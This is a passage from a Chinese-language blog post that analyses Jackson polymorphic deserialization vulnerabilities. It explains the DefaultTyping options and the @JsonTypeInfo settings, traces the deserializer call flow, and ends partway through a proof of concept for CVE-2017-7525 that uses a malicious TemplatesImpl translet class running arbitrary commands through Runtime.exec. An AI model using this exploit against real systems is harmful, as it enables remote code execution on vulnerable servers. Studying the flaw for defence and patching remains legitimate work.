<span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916110448375.png" alt="image-20200916110448375"></p><h3 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h3><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p><p>例如下面的代码，添加了类型为l1nk3r的变量，非Object也非虚，但也可以被序列化出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        nonePeople p = <span class="keyword">new</span> nonePeople();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"0range"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Teacher();</span><br><span class="line">        p.sex=<span class="keyword">new</span> MySex();</span><br><span class="line">        p.teacher=<span class="keyword">new</span> Teacher();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">      <span class="comment">//设置NON_FINAL</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line">      </span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        nonePeople nonePeople = mapper.readValue(json, nonePeople<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(nonePeople);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nonePeople</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line">    <span class="keyword">public</span> Teacher teacher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看结果：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916110938041.png" alt="image-20200916110938041"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p><table><thead><tr><th align="left">DefaultTyping类型</th><th align="left">描述说明</th></tr></thead><tbody><tr><td align="left">JAVA_LANG_OBJECT</td><td align="left">属性的类型为Object</td></tr><tr><td align="left">OBJECT_AND_NON_CONCRETE</td><td align="left">属性的类型为Object、Interface、AbstractClass</td></tr><tr><td align="left">NON_CONCRETE_AND_ARRAYS</td><td align="left">属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td align="left">NON_FINAL</td><td align="left">所有除了声明为final之外的属性</td></tr></tbody></table><h2 id="JsonTypeInfo注解"><a href="#JsonTypeInfo注解" class="headerlink" title="@JsonTypeInfo注解"></a>@JsonTypeInfo注解</h2><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure><p>讲到底，其实就是给类中属性加注解。</p><h3 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h3><p>demo如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JTTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper= <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name= <span class="string">"0range"</span>;</span><br><span class="line">        user.age=<span class="number">100</span>;</span><br><span class="line">        user.obj=<span class="keyword">new</span> Height();</span><br><span class="line">        String json = mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span> + name + <span class="string">" age:"</span> + age + <span class="string">" obj:"</span> + obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Height</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> h = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916143527537.png" alt="image-20200916143527537"></p><p>和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的。</p><p>这种方式的输出结果实际上是我们最想要的，这里只需要相关参数的值，并没有其他一些无用信息。</p><h3 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h3><p>修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.CLASS。</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916143723383.png" alt="image-20200916143723383"></p><p>输出看到，object属性中多了”@class”:”com.fxc.Height”，即含有具体的类的信息，同时反序列化出来的object属性Height类对象，即能够成功对指定类型进行序列化和反序列化：</p><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p><h3 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h3><p>修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.MINIMAL_CLASS。</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916143921325.png" alt="image-20200916143921325"></p><p>输出看到，object属性中多了”@c”:”com.fxc.Height”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用。</p><h3 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h3><p>修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.NAME。</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916144431986.png" alt="image-20200916144431986"></p><p>输出看到，object属性中多了”@type”:”Height”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的。</p><h3 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h3><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916145715384.png" alt="image-20200916145715384"></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>所以按照上述分析，3种情况下可以触发Jackson反序列化漏洞</p><p>1、enableDefaultTyping()</p><p>2、@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</p><p>3、@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</p><h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><p>调试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String json=<span class="string">"&#123;\"age\":10,\"name\":\"0range\",\"sex\":[\"com.fxctest.MySex\",&#123;\"sex\":100&#125;]&#125;"</span>;</span><br><span class="line">        People p2 = mapper.readValue(json, People<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, sex=%d"</span>, age, name,sex.getSex());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里函数调用极其复杂，总体归纳出下面这张图：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916153735705.png" alt="image-20200916153735705"></p><p>整体流程：</p><ol><li><p>BeanDeserializer.deserialize()函数中，调用了vanillaDeserialize()函数；</p></li><li><p>跟进去，BeanDeserializer.vanillaDeserialize()函数的实现比较简单，先调用createUsingDefault()函数来调用指定类的无参构造函数来生成类实例；</p></li><li><p>BeanDeserializer.vanillaDeserialize()函数调用完无参的类的构造函数生成实例Bean后，就开始进入do while循环，来循环解析键值对中的属性值并调用deserializeAndSet()函数来解析并设置Bean的属性值；</p></li><li><p>跟进该SettableBeanProperty.deserialize()函数，可以看到有两个反序列化的代码逻辑，其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916155244721.png" alt="image-20200916155244721"></p></li><li><p>跟进AbstractDeserializer.deserializeWithType()函数中，进一步调用了AsArrayTypeDeserializer.deserializeTypedFromObject()函数来解析：</p></li></ol><p>其中 <code>BeanDeserializerBase#vanillaDeserialize</code> 中有两个关键点：</p><p>1、<code>StdValueInstantiator#createUsingDefault</code> 方法负责调用 <code>AnnotatedConstructor#call</code>中call方法，然后通过反射方式来寻找我们从json中输入的类。</p><p>2、<code>MethodProperty#deserializeAndSet</code> 方法负责寻找相关setter设置，这里也是通过invoke反射的方式。</p><p>简单梳理一遍，Jackson反序列化的过程为：</p><ol><li>先调用通过无参的构造函数生成目标类实例</li><li>接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用Object类型属性的构造函数和setter方法。</li></ol><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。</p><p>而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。</p><h2 id="CVE-2017-7525（基于TemplatesImpl利用链）"><a href="#CVE-2017-7525（基于TemplatesImpl利用链）" class="headerlink" title="CVE-2017-7525（基于TemplatesImpl利用链）"></a>CVE-2017-7525（基于TemplatesImpl利用链）</h2><h3 id="环境限制"><a href="#环境限制" class="headerlink" title="环境限制"></a>环境限制</h3><p>Jackson 2.6系列 &lt; 2.6.7.1</p><p>Jackson 2.7系列 &lt; 2.7.9.1</p><p>Jackson 2.8系列 &lt; 2.8.8.1</p><p>JDK版本为1.7.0_21</p><p>本地用的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，commons-codec-1.12，commons-io-2.5，spring-core-4.3.13.RELEASE。</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>直接上代码，首先是Exploit.java，恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//修改成你想要执行的命令</span></span><br><span class="line">            Process p = Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">"\n"</span>);</span><br><span class="line">                System.out.println(sb);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            File file = <span class="keyword">new</span> File(<span class="string">"result.txt"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//if file doesnt exists, then create it</span></span><br><span class="line">            <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//true = append file</span></span><br><span class="line">            FileWriter fileWritter = <span class="keyword">new</span> FileWriter(file.getName(),<span class="keyword">true</span>);</span><br><span class="line">            BufferedWriter bufferWritter = <span class="keyword">new</span> BufferedWriter(fileWritter);</span><br><span class="line">            bufferWritter.write(sb.toString());</span><br><span class="line">            bufferWritter.close();</span><br><span class="line">            System.out.println(sb);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String exp = readClassStr(<span class="string">"/Users/fengxincheng/Desktop/jackson_test/target/classes/com/TemplateImpl/Exploit.class"</span>);</span><br><span class="line">        String jsonInput = aposToQuotes(<span class="string">"&#123;\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n"</span> +</span><br><span class="line">                <span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"'transletBytecodes':['"</span>+exp+<span class="string">"'],\n"</span> +</span><br><span class="line">                <span class="string">"'transletName':'test',\n"</span> +</span><br><span class="line">                <span class="string">"'outputProperties':&#123;&#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;\n"</span> +</span><br><span class="line">                <span class="string">"]\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Test test;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test = mapper.readValue(jsonInput, Test<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">aposToQuotes</span><span class="params">(String json)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">"'"</span>,<span class="string">"\""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClassStr</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileCopyUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)),byteArrayOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span 